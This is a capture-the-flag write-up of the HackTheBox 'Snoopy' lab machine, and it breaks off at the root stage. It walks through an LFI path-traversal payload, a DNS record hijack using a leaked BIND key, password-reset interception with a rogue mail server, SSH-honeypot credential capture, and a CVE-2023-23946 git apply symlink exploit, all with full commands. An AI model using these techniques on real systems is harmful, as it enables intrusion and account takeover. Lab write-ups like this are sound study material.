---
render_with_liquid: false
title: HackTheBox Writeup  Snoopy
date: 2023-09-21 16:58:37 +1400
tags: [hackthebox, nmap, linux, autorecon, feroxbuster, user-enumeration, dns, directory-traversal, discover-secrets, email, mattermost, dns-bind, misconfiguration, subdomain-takeover, password-reset-abuse, rogue-smtp, mattermost-integrations, rogue-ssh, honeypots, sudo, git, cve-2023-23946, file-write, clamav, cve-2023-20032, file-read]
---



Snoopy is a Hard Difficulty Linux machine that involves the exploitation of an LFI vulnerability to extract the configuration secret of `Bind9`. The obtained secret allows the redirection of the `mail` subdomain to the attacker&amp;amp;#039;s IP address, facilitating the interception of password reset requests within the `Mattermost` chat client. Within that service, a custom plugin designed for web admins to log into remote servers is manipulated to direct them to a server set up as an `SSH honeypot`, leading to the interception of `cbrown`&amp;amp;#039;s credentials. Exploiting the privileges of `cbrown`, the attacker utilizes the ability to execute `git apply` as `sbrown`, resulting in a unique symlinking attack for privilege escalation. The final stage involves the abuse of `CVE-2023-20052` to include the `root` user&amp;amp;#039;s `SSH` key into a file via `XXE`, with the payload scanned by `clamscan` to trigger the `XXE` output in the debug response.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ pt init '10.129.229.5 mail.snoopy.htb mattermost.snoopy.htb mm.snoopy.htb ns1.snoopy.htb ns2.snoopy.htb postgres.snoopy.htb provisions.snoopy.htb snoopy.htb www.snoopy.htb'
+---------+--------+--------------+-----------------------+
| PROFILE | STATUS |      IP      |        DOMAIN         |
+---------+--------+--------------+-----------------------+
| snoopy  | on     | 10.129.229.5 | mail.snoopy.htb       |
| snoopy  | on     | 10.129.229.5 | mattermost.snoopy.htb |
| snoopy  | on     | 10.129.229.5 | mm.snoopy.htb         |
| snoopy  | on     | 10.129.229.5 | ns1.snoopy.htb        |
| snoopy  | on     | 10.129.229.5 | ns2.snoopy.htb        |
| snoopy  | on     | 10.129.229.5 | postgres.snoopy.htb   |
| snoopy  | on     | 10.129.229.5 | provisions.snoopy.htb |
| snoopy  | on     | 10.129.229.5 | snoopy.htb            |
| snoopy  | on     | 10.129.229.5 | www.snoopy.htb        |
+---------+--------+--------------+-----------------------+
```

## Autorecon

```bash
sudo $(which autorecon) -vv --dirbuster.wordlist="/usr/share/seclists/Discovery/Web-Content/common.txt" --global.domain="snoopy.htb"
```

## Nmap

```bash

# Nmap 7.94 scan initiated Thu Sep 21 16:58:37 2023 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/htb/Snoopy/results/snoopy.htb/scans/_full_tcp_nmap.txt -oX /home/kali/htb/Snoopy/results/snoopy.htb/scans/xml/_full_tcp_nmap.xml snoopy.htb
adjust_timeouts2: packet supposedly had rtt of -699536 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -699536 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -447246 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -447246 microseconds.  Ignoring time.
Nmap scan report for snoopy.htb (10.129.229.5)
Host is up, received user-set (0.070s latency).
Scanned at 2023-09-21 16:58:37 CST for 64s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEwa6lTzS8uZRb7EebEXbLkAU0FpJ8k9KO+YwTTeEE7E3VgGZr4vOP4EOZce1XDgwR18wt0WOCiYz6pi6M4y4Lw=
|   256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZTgpF2zR6Xamvdn+NyIUGFtq7hXBd7RK3SM00IMQht
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running (JUST GUESSING): Linux 5.X|4.X|2.6.X (89%)
OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6.32
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 5.0 (89%), Linux 4.15 - 5.8 (88%), Linux 5.3 - 5.4 (87%), Linux 2.6.32 (87%), Linux 5.0 - 5.5 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94%E=4%D=9/21%OT=22%CT=1%CU=%PV=Y%DS=8%DC=T%G=N%TM=650C05FD%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)
OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=N)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=N)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T6(R=Y%DF=Y%TG=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 32.022 days (since Sun Aug 20 16:28:28 2023)
Network Distance: 8 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   ... 7
8   145.93 ms snoopy.htb (10.129.229.5)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Thu Sep 21 16:59:42 2023 -- 1 IP address (1 host up) scanned in 64.74 seconds
```


## 80 - Site : SnoopySec


### Info

![](/assets/obsidian/f5562f7060536a67aad9ff4fc3912559.png)

### Directory

```bash
feroxbuster -k -t 150 -u 'http://snoopy.htb' -w /usr/share/seclists/Discovery/Web-Content/big.txt -o ferox_80.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ cat ferox_80.txt|awk '$1!=403'|grep -v 'snoopy.htb/assets/'
200      GET      243l      708w    10248c http://snoopy.htb/contact.html
200      GET      268l      727w    11115c http://snoopy.htb/team.html
200      GET      365l     1261w    16614c http://snoopy.htb/about.html
200      GET      480l     1818w    23418c http://snoopy.htb/index.html
200      GET        0l        0w 11363570c http://snoopy.htb/download
200      GET      480l     1818w    23418c http://snoopy.htb/
```

### Sub Domains

```bash
gobuster vhost -t 50 --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://snoopy.htb
```

```bash
Found: mm.snoopy.htb Status: 200 [Size: 3132]
```

## Usernames

```sql

## Contact
info


# Team

## Charles Schultz | Chief Executive Officer
cschultz

## Sally Brown | Product Manager
sbrown

## Harold Angel | CTO
hangel

## Lucy Van Pelt | Accountant
lpelt


# Anouncement PDF

## Sally Brown | SnoopySec PR
pr
```

> http://snoopy.htb/

![](/assets/obsidian/880d89356c55560d1f0cb1cd79dd286a.png)

![](/assets/obsidian/ff96badb7f724617a02b4394a68a70c6.png)

> `snoopysec_marketing.mp4` from http://snoopy.htb/download

![](/assets/obsidian/9b2ceb7b5fb36aa9f328a1ad49b94b95.png)

> `pr` from http://snoopy.htb/download

![](/assets/obsidian/2fbd69f386d34d0a8ab0a4775a65757d.png)

# User Flag
---

## Enumeration


### Mail subdomain disclosure

> http://snoopy.htb/contact.html

![](/assets/obsidian/aa23f54d69c6e4839ab85a3a4e4c531a.png)

```
mail.snoopy.htb
```

### DNS records

> http://snoopy.htb/

Found `snoopy.htb` at home page, and potential directory traversal

![](/assets/obsidian/2e9e652f806548167e8f59b31e42846c.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ dig axfr snoopy.htb @10.129.229.5

; <<>> DiG 9.18.16-1-Debian <<>> axfr snoopy.htb @10.129.229.5
;; global options: +cmd
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
mm.snoopy.htb.          86400   IN      A       127.0.0.1
ns1.snoopy.htb.         86400   IN      A       10.0.50.10
ns2.snoopy.htb.         86400   IN      A       10.0.51.10
postgres.snoopy.htb.    86400   IN      A       172.18.0.2
provisions.snoopy.htb.  86400   IN      A       172.18.0.4
www.snoopy.htb.         86400   IN      A       127.0.0.1
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
;; Query time: 55 msec
;; SERVER: 10.129.229.5#53(10.129.229.5) (TCP)
;; WHEN: Thu Sep 21 17:02:08 CST 2023
;; XFR size: 11 records (messages 1, bytes 325)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ vi dig.cleaned.txt

┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ sed -i 's/.$//' dig.cleaned.txt

┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ cat dig.cleaned.txt|sort -u
mattermost.snoopy.htb
mm.snoopy.htb
ns1.snoopy.htb
ns2.snoopy.htb
postgres.snoopy.htb
provisions.snoopy.htb
snoopy.htb
www.snoopy.htb
```

Write to hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ pt init '10.129.229.5 mail.snoopy.htb mattermost.snoopy.htb mm.snoopy.htb ns1.snoopy.htb ns2.snoopy.htb postgres.snoopy.htb provisions.snoopy.htb snoopy.htb www.snoopy.htb'
```

### snoopy.htb

#### Directory Traversal

There's an endpoint allow me to specify file to download

![](/assets/obsidian/4a3944482b923e5a0139eae84d2fbb7f.png)

![](/assets/obsidian/b9bf713ada6bdad7f4f0e6c289ba7a84.png)

Fuzz for LFI

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://snoopy.htb/download?file=FUZZ' -fs 0
```

![](/assets/obsidian/fa969f50e76b26d5f5cb9506a3a49491.png)

Check users

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ http 'http://snoopy.htb/download?file=....//....//....//....//etc/passwd'
HTTP/1.1 200 OK
Connection: keep-alive
Content-Disposition: attachment; filename=press_release.zip
Content-Length: 796
Content-Type: application/zip
Date: Thu, 21 Sep 2023 11:57:27 GMT
Server: nginx/1.18.0 (Ubuntu)



+-----------------------------------------+
| NOTE: binary data not shown in terminal |
+-----------------------------------------+
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot]
└─$ wget 'http://snoopy.htb/download?file=....//....//....//....//etc/passwd'

┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot]
└─$ file 'download?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd'
download?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd: Zip archive data, at least v2.0 to extract, compression method=deflate

┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot]
└─$ unzip -l download\?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
Archive:  download?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
  Length      Date    Time    Name
---------  ---------- -----   ----
     1805  2023-04-25 19:38   press_package/etc/passwd
---------                     -------
     1805                     1 file

┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot]
└─$ zcat download\?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd|grep sh$
root:x:0:0:root:/root:/bin/bash
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
```

Tried to get ssh keys, but failed

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot]
└─$ zcat download\?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd|grep sh$|cut -d ':' -f1|xargs
root cbrown sbrown lpelt cschultz vgray

┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot]
└─$ for u in $(echo "root cbrown sbrown lpelt cschultz vgray"); do wget "http://snoopy.htb/download?file=....//....//....//....//home/$u/.ssh/id_rsa"; done

┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot]
└─$ ls -la
total 12
drwxr-xr-x 7 bravosec kali 4096 Sep 21 18:56  ..
-rw-r--r-- 1 bravosec kali  796 Sep 21 19:57 'download?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd'
-rw-r--r-- 1 bravosec kali    0 Sep 21 20:01 'download?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Froot%2F.ssh%2Fid_rsa'
-rw-r--r-- 1 bravosec kali    0 Sep 21 20:01 'download?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fcbrown%2F.ssh%2Fid_rsa'
-rw-r--r-- 1 bravosec kali    0 Sep 21 20:01 'download?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fsbrown%2F.ssh%2Fid_rsa'
-rw-r--r-- 1 bravosec kali    0 Sep 21 20:01 'download?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Flpelt%2F.ssh%2Fid_rsa'
-rw-r--r-- 1 bravosec kali    0 Sep 21 20:01 'download?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fcschultz%2F.ssh%2Fid_rsa'
-rw-r--r-- 1 bravosec kali    0 Sep 21 20:01 'download?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fvgray%2F.ssh%2Fid_rsa'
drwxr-xr-x 2 bravosec kali 4096 Sep 21 20:02  .
```

### mm.snoopy.htb

> http://mm.snoopy.htb/login

![](/assets/obsidian/722e8ed6a85fe46de4bf22d23b28f516.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ feroxbuster -k -t 150 -u 'http://mm.snoopy.htb' -w /usr/share/seclists/Discovery/Web-Content/big.txt -o ferox_mm.txt
... 

┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ cat ferox_mm.txt | awk '$4!="0w"'
200      GET        2l        4w       26c http://mm.snoopy.htb/robots.txt
```

> http://mm.snoopy.htb/reset_password

![](/assets/obsidian/b19bb4b7750997069cb91b28607bbb62.png)

![](/assets/obsidian/279a42925b29f0914f9c4202c92f93de.png)

## From mattermost service to RCE


### Dump config files via ffuf

Find files in `/etc/`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot]
└─$ ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -u 'http://snoopy.htb/download?file=....//....//....//..../FUZZ' -fs 0 -od ffuf_lfi
```

Download files from the result

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot]
└─$ mkdir etc_files

┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot]
└─$ cd etc_files

┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot/etc_files]
└─$ for url in $(cat ../ffuf_etc_files.txt|jq .results[].url -r); do wget $url -O tmp && zcat tmp > $(echo $url|sed -e 's/^.*?file=.*\/\///g' -e 's/\//_/g'); done
```


### Subdomain Takeover : mail.snoopy.htb

Grep for secrets

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot/etc_files]
└─$ grep -riE 'pass|pwd|secret'
```

![](/assets/obsidian/53d73a62f14c805e15e4bd5820747514.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot/etc_files]
└─$ cat etc_bind_named.conf
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the
// structure of BIND configuration files in Debian, *BEFORE* you customize
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

Since nmap scan shows it's using `bind` as dns server

```bash
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
```

> Hacktricks - https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#config-files

![](/assets/obsidian/4db128e9b44c7cf19cfb1047ad8a8d96.png)

Check the local config of `bind`, it have `allow-transfer`, and our IP is in the range

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot/etc_files]
└─$ cat etc_bind_named.conf.local
//
// Do any local configuration here
//

// Consider adding the 1918 zones here, if they are not used in your
// organization
//include "/etc/bind/zones.rfc1918";

zone "snoopy.htb" IN {
    type master;
    file "/var/lib/bind/db.snoopy.htb";
    allow-update { key "rndc-key"; };
    allow-transfer { 10.0.0.0/8; };
};
```

Check the included db file, subdomain `mail` was not binded

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot/etc_files]
└─$ wget 'http://snoopy.htb/download?file=....//....//....//....//var/lib/bind/db.snoopy.htb'

┌──(bravosec㉿fsociety)-[~/htb/Snoopy/loot/etc_files]
└─$ zcat download\?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fvar%2Flib%2Fbind%2Fdb.snoopy.htb
$ORIGIN .
$TTL 86400      ; 1 day
snoopy.htb              IN SOA  ns1.snoopy.htb. ns2.snoopy.htb. (
                                2022032612 ; serial
                                3600       ; refresh (1 hour)
                                1800       ; retry (30 minutes)
                                604800     ; expire (1 week)
                                86400      ; minimum (1 day)
                                )
                        NS      ns1.snoopy.htb.
                        NS      ns2.snoopy.htb.
$ORIGIN snoopy.htb.
$TTL 86400      ; 1 day
mattermost              A       172.18.0.3
mm                      A       127.0.0.1
ns1                     A       10.0.50.10
ns2                     A       10.0.51.10
mattermost              A       172.18.0.3
postgres                A       172.18.0.2
provisions              A       172.18.0.4
www                     A       127.0.0.1
```

Request to update the dns record for `mail.snoopy.htb` to point to our IP

> Since the record will be reset every 30 seconds, I'll use a while loop (Only do this if have VIP+)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ while true; do nsupdate -y 'hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=' -d << EOF
server snoopy.htb
update add mail.snoopy.htb. 77777 IN A 10.10.16.10
send
EOF
; sleep 15; done
```

Verified that we have took over the `mail` subdomain

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ nslookup
> server snoopy.htb
Default server: snoopy.htb
Address: 10.129.69.239#53

> mail.snoopy.htb
;; communications error to 10.129.69.239#53: timed out
Server:         snoopy.htb
Address:        10.129.69.239#53

Name:   mail.snoopy.htb
Address: 10.10.16.10
```


### Rogue mail server : Receive password reset link

Google : `python simple smtp server`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ python -m smtpd -c DebuggingServer -n 0.0.0.0:25
```

![](/assets/obsidian/21459482071b9125695216de7aaf6066.png)

![](/assets/obsidian/0597fac40913415f341a2934ae7c9b33.png)

![](/assets/obsidian/f12aa46d171d44c891decd76e926251b.png)

> Need to remove the `3D` words in the token
{: .prompt-tip }

> http://mm.snoopy.htb/reset_password_complete?token=3hy9icuyxb1j5ha88zic163nz1mc8qcznnoddmkodeko8mx5ka4w8o7m1js4g8tf

![](/assets/obsidian/b715aa893d0a643b6f57671f79f02333.png)

After login

![](/assets/obsidian/6cc6daecaf21e1d2c4ea21c7ea35b079.png)

### Login as cbrown and enumerate

User `cbrown` is in our direct message archive

![](/assets/obsidian/0e87aa5f77d146de3f43db9fe4d6efde.png)

And according to message history, he is the one who created the channel related to IT security

![](/assets/obsidian/926db692f397c1d781f56d9ef836b504.png)

Switched to his account by resetting his password refer to previous steps

Tried some interesting functions in playbooks and found some credentials, but failed at password reuse

![](/assets/obsidian/14cf918a66dadcdfa9a3678270239d0c.png)

![](/assets/obsidian/50ba18b1077d41fbc471ed8b516aa2d8.png)

![](/assets/obsidian/99d731541a6051b03b7483c04322143d.png)

Tried password for valid users on the machine

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ for u in $(echo "root cbrown sbrown lpelt cschultz vgray"); do cssh $u@snoopy.htb 'Sysadmin123' ; done
```


### Integrations available for user sbrown

Found out only `sbrown` have the integrations function

![](/assets/obsidian/9460eb1e61737dd4408cf506051d1548.png)

![](/assets/obsidian/210446d4ae57e287c1c992a59865b190.png)

I immediately clicked the `Slash Commands` because it have a command prompt logo XD

![](/assets/obsidian/9cbf17524ad531c3da20a61cc2cd0ce2.png)

> Request an IT staff member to provision a new server

Clicked on `edit`

![](/assets/obsidian/7a975699e0796084b2850a9208bc1d0c.png)

That seems to be interesting, try it out in a private channel

![](/assets/obsidian/8314babf80c9ac89e0212e09a394b336.png)

![](/assets/obsidian/ec357b224239b3593aade40526d1935c.png)

I can choose a port, vert interesting...

![](/assets/obsidian/7d3e44ae93d3745120e7c40478d306aa.png)

![](/assets/obsidian/83e7daf36909f3e19c13bad396da9a69.png)

Listen on port `2222` and see what it does

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
connect to [10.10.16.10] from (UNKNOWN) [10.129.70.10] 55498
SSH-2.0-paramiko_3.1.0
```

It sent ssh request, I'll setup a honeypot to capture credentials

> https://github.com/qeeqbox/honeypots

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ source ~/venv-py3.8/bin/activate

┌──(venv-py3.8)─(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ honeypots --setup ssh:2222 --options capture_commands
```

Result :

```bash
{"action": "connection", "dest_ip": "0.0.0.0", "dest_port": "2222", "server": "ssh_server", "src_ip": "10.129.70.10", "src_port": "35846", "timestamp": "2023-09-22T17:43:19.643479"}
{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "2222", "password": "sn00pedcr3dential!!!", "server": "ssh_server", "src_ip": "10.129.70.10", "src_port": "35846", "status": "failed", "timestamp": "2023-09-22T17:43:20.803555", "username": "cbrown"}
```

SSH as `cbrown`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ cssh cbrown@snoopy.htb 'sn00pedcr3dential!!!'
Warning: Permanently added 'snoopy.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
cbrown@snoopy:~$ id
uid=1000(cbrown) gid=1000(cbrown) groups=1000(cbrown),1002(devops)
cbrown@snoopy:~$ cat user.txt
cat: user.txt: No such file or directory
```


## From cbrown to sbrown


### Try to abuse "git apply"

```bash
cbrown@snoopy:~$ sudo -l
[sudo] password for cbrown:
Matching Defaults entries for cbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
cbrown
```

I can't read files but can write to files as `sbrown`

The trick from gtfobins won't work since it have regex filter : `^apply -v [a-zA-Z0-9.]+$`

> https://gtfobins.github.io/gtfobins/git/#file-write

Google : `git apply exploit`

> https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/

Create a patch that will write my ssh pub key to `sbrown`'s `authorized_keys`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ sudo mkdir -p /home/sbrown/.ssh

┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ sudo chown -R bravosec /home/sbrown

┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ cat ~/.ssh/id_rsa.pub > /home/sbrown/.ssh/authorized_keys

┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ git diff /dev/null /home/sbrown/.ssh/authorized_keys > /tmp/patch

┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ cat /tmp/patch
diff --git a/home/sbrown/.ssh/authorized_keys b/home/sbrown/.ssh/authorized_keys
new file mode 100644
index 0000000..3038d0b
--- /dev/null
+++ b/home/sbrown/.ssh/authorized_keys
@@ -0,0 +1 @@
+ssh-rsa AAAAB3NzaC1y.../enVjxsxpG91YoXDWPH1etLL9IE= kali@kali
```

Put that patch on target machine

```bash
cbrown@snoopy:~$ cd /tmp
cbrown@snoopy:/tmp$ vi p
```

![](/assets/obsidian/cc827a097b812d4cba91dd6fa83d8f8f.png)

Failed...

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ ssh sbrown@snoopy.htb
sbrown@snoopy.htb's password:
```

There's a new home dir created in `/tmp`, assume directory was locked to current dir

```bash
cbrown@snoopy:/tmp$ sudo -u sbrown git apply -v p
Checking patch home/sbrown/.ssh/authorized_keys...
Applied patch home/sbrown/.ssh/authorized_keys cleanly.
cbrown@snoopy:/tmp$ ls -altr
total 60
drwxr-xr-x 19 root   root   4096 Apr 25 18:38 ..
...
-rw-rw-r--  1 cbrown cbrown  756 Sep 22 18:06 p
drwxr-xr-x  3 sbrown sbrown 4096 Sep 22 18:06 home
drwxrwxrwt 14 root   root   4096 Sep 22 18:07 .
```


### Abuse "git apply" (CVE-2023-23946)

Further research on `exploiting git apply`

> https://github.blog/2023-02-14-git-security-vulnerabilities-announced-3/

![](/assets/obsidian/c2589085b217866648bd12f079d8c910.png)

> https://github.com/git/git/security/advisories/GHSA-r87m-v37r-cwfh

![](/assets/obsidian/c909ec016d4731ed4dece4715c883bca.png)

And the git version on target machine is vulnerable

```bash
cbrown@snoopy:/tmp$ git --version
git version 2.34.1
```

> POC : https://github.com/bruno-1337/CVE-2023-23946-POC

```bash
cbrown@snoopy:/tmp$ vi p
```

```diff
diff --git a/ok b/notok
rename from ok
rename to notok
--
diff --git /dev/null b/notok/kkk
new file mode 100644
index 0000000..e47f4ea
--- /dev/null
+++ b/notok/authorized_keys
@@ -0,0 +1 @@
+ssh-rsa AAAAB3NzaC1yc2E...kMCVDGOy1FvT/enVjxsxpG91YoXDWPH1etLL9IE= kali@kali
```

```bash
cbrown@snoopy:/tmp$ ln -s /home/sbrown/.ssh/ ok
cbrown@snoopy:/tmp$ sudo -u sbrown git apply -v p
Checking patch ok => notok...
Checking patch notok/authorized_keys...
warning: unable to unlink 'ok': Operation not permitted
Applied patch ok => notok cleanly.
Applied patch notok/authorized_keys cleanly.
```

### SSH as sbrown

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ ssh sbrown@snoopy.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

sbrown@snoopy:~$ id
uid=1001(sbrown) gid=1001(sbrown) groups=1001(sbrown),1002(devops)
sbrown@snoopy:~$ cat user.txt
bcfdbd430a4c04fa2f512a5f5c197cec
```


# Root Flag
---

## From sbrown to root

```bash
sbrown@snoopy:~$ sudo -l
Matching Defaults entries for sbrown on snoopy:
